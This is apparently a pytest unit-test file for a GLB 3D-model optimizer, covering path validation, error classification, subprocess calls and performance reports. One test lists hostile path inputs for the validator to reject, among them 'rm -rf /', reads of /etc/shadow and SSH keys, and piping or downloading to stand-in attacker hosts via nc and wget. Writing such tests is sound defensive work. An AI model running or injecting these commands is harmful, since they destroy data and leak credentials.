# tests/test_optimizer.py
"""
Unit tests for the GLBOptimizer class
Tests core optimization logic in isolation
"""
import pytest
import os
import tempfile
from unittest.mock import patch, MagicMock
from optimizer import GLBOptimizer

class TestGLBOptimizer:
    """Test suite for GLBOptimizer class"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.optimizer = GLBOptimizer(quality_level='high')
    
    def test_init_with_quality_levels(self):
        """Test optimizer initialization with different quality levels"""
        # Test all quality levels
        quality_levels = ['high', 'balanced', 'maximum_compression']
        
        for level in quality_levels:
            optimizer = GLBOptimizer(quality_level=level)
            assert optimizer.quality_level == level
            assert optimizer.detailed_logs == []
    
    def test_validate_path_safe_paths(self):
        """Test path validation with safe file paths"""
        safe_paths = [
            '/uploads/test_model.glb',
            'uploads/safe_file.glb',
            './output/optimized.glb',
            'temp/file_123.glb'
        ]
        
        for path in safe_paths:
            # Should not raise exception for safe paths
            validated_path = self.optimizer._validate_path(path, allow_temp=True)
            assert validated_path == os.path.abspath(path)
    
    def test_validate_path_malicious_paths(self):
        """Test path validation blocks malicious paths"""
        malicious_paths = [
            '; rm -rf /',
            '../../etc/passwd',
            '/etc/shadow',
            'file.glb; cat /etc/passwd',
            '../../../root/.ssh/id_rsa',
            'test.glb | nc attacker.com 1234',
            'file.glb && wget malicious.com/script.sh'
        ]
        
        for path in malicious_paths:
            with pytest.raises(ValueError, match="Invalid file path"):
                self.optimizer._validate_path(path)
    
    def test_analyze_error_timeout_detection(self):
        """Test error analysis correctly identifies timeout errors"""
        timeout_stderr = "Process terminated due to timeout after 600 seconds"
        timeout_stdout = ""
        
        analysis = self.optimizer._analyze_error(timeout_stderr, timeout_stdout, "test_step")
        
        assert "timeout" in analysis["category"].lower()
        assert "time limit" in analysis["user_message"].lower()
        assert analysis["severity"] == "high"
    
    def test_analyze_error_memory_detection(self):
        """Test error analysis correctly identifies memory errors"""
        memory_stderr = "Error: Cannot allocate memory for mesh processing"
        memory_stdout = ""
        
        analysis = self.optimizer._analyze_error(memory_stderr, memory_stdout, "geometry")
        
        assert "memory" in analysis["category"].lower()
        assert "file size" in analysis["user_message"].lower()
        assert analysis["severity"] == "high"
    
    def test_analyze_error_format_detection(self):
        """Test error analysis correctly identifies file format errors"""
        format_stderr = "Invalid GLB format: missing magic header"
        format_stdout = ""
        
        analysis = self.optimizer._analyze_error(format_stderr, format_stdout, "validation")
        
        assert "format" in analysis["category"].lower()
        assert "valid GLB" in analysis["user_message"].lower()
        assert analysis["severity"] == "high"
    
    @patch('optimizer.subprocess.run')
    def test_run_subprocess_success(self, mock_run):
        """Test successful subprocess execution"""
        # Mock successful command execution
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Operation completed successfully",
            stderr=""
        )
        
        result = self.optimizer._run_subprocess(
            ['gltf-transform', 'prune', 'input.glb', 'output.glb'],
            "test_step",
            "Testing subprocess"
        )
        
        assert result["success"] is True
        assert "Operation completed successfully" in result["stdout"]
        mock_run.assert_called_once()
    
    @patch('optimizer.subprocess.run')
    def test_run_subprocess_failure(self, mock_run):
        """Test subprocess execution with command failure"""
        # Mock failed command execution
        mock_run.return_value = MagicMock(
            returncode=1,
            stdout="",
            stderr="Error: Invalid input file"
        )
        
        result = self.optimizer._run_subprocess(
            ['gltf-transform', 'prune', 'invalid.glb', 'output.glb'],
            "test_step",
            "Testing subprocess failure"
        )
        
        assert result["success"] is False
        assert "Error: Invalid input file" in result["stderr"]
        assert result["returncode"] == 1
    
    @patch('optimizer.subprocess.run')
    def test_run_subprocess_timeout(self, mock_run):
        """Test subprocess execution with timeout"""
        from subprocess import TimeoutExpired
        
        # Mock timeout exception
        mock_run.side_effect = TimeoutExpired(['gltf-transform'], 30)
        
        result = self.optimizer._run_subprocess(
            ['gltf-transform', 'prune', 'large.glb', 'output.glb'],
            "test_step",
            "Testing timeout"
        )
        
        assert result["success"] is False
        assert "timeout" in result["error"].lower()
    
    def test_estimate_gpu_memory_savings(self):
        """Test GPU memory savings estimation"""
        # Test with typical compression ratios
        test_cases = [
            (10000000, 3000000, 0.7),  # 70% file reduction
            (5000000, 4000000, 0.2),   # 20% file reduction
            (1000000, 100000, 0.9),    # 90% file reduction
        ]
        
        for original, compressed, expected_min in test_cases:
            savings = self.optimizer._estimate_gpu_memory_savings(original, compressed)
            
            # GPU memory savings should be at least the file size reduction ratio
            file_reduction = (original - compressed) / original
            assert savings >= file_reduction * expected_min
            assert 0 <= savings <= 1  # Should be between 0 and 100%
    
    def test_generate_performance_report(self):
        """Test performance report generation"""
        with tempfile.NamedTemporaryFile(suffix='.glb') as input_file, \
             tempfile.NamedTemporaryFile(suffix='.glb') as output_file:
            
            # Write some data to files
            input_file.write(b'x' * 1000)
            input_file.flush()
            output_file.write(b'x' * 400)
            output_file.flush()
            
            report = self.optimizer._generate_performance_report(
                input_file.name,
                output_file.name,
                processing_time=25.5
            )
            
            # Verify report structure
            assert 'original_size_mb' in report
            assert 'compressed_size_mb' in report
            assert 'compression_ratio' in report
            assert 'processing_time' in report
            assert 'estimated_gpu_memory_savings' in report
            assert 'web_game_ready' in report
            
            # Verify calculations
            assert report['compression_ratio'] == 0.6  # 400/1000 = 0.4 reduction
            assert report['processing_time'] == 25.5
    
    @patch('optimizer.subprocess.run')
    def test_optimize_complete_workflow(self, mock_run):
        """Test complete optimization workflow"""
        # Mock all subprocess calls to succeed
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Processing completed",
            stderr=""
        )
        
        with tempfile.NamedTemporaryFile(suffix='.glb') as input_file, \
             tempfile.NamedTemporaryFile(suffix='.glb') as output_file:
            
            # Write test data
            input_file.write(b'x' * 1000)
            input_file.flush()
            
            progress_updates = []
            def mock_progress(step, progress, message):
                progress_updates.append((step, progress, message))
            
            result = self.optimizer.optimize(
                input_file.name,
                output_file.name,
                progress_callback=mock_progress
            )
            
            # Verify optimization completed
            assert result['success'] is True
            assert len(progress_updates) > 0  # Should have progress updates
            
            # Verify all optimization steps were attempted
            expected_steps = ['prune', 'weld', 'geometry', 'textures', 'animations', 'final']
            called_commands = [call.args[0] for call in mock_run.call_args_list]
            
            # Should have called multiple gltf-transform/gltfpack commands
            assert len(called_commands) >= 3
    
    def test_get_detailed_logs(self):
        """Test detailed logs retrieval"""
        # Add some test logs
        test_logs = [
            "Starting optimization process",
            "Pruning unused data",
            "Welding vertices",
            "Optimization completed"
        ]
        
        self.optimizer.detailed_logs = test_logs
        
        formatted_logs = self.optimizer.get_detailed_logs()
        
        # Verify logs are properly formatted
        assert isinstance(formatted_logs, str)
        for log in test_logs:
            assert log in formatted_logs
        
        # Should include timestamp information
        assert "GLB Optimizer Detailed Logs" in formatted_logs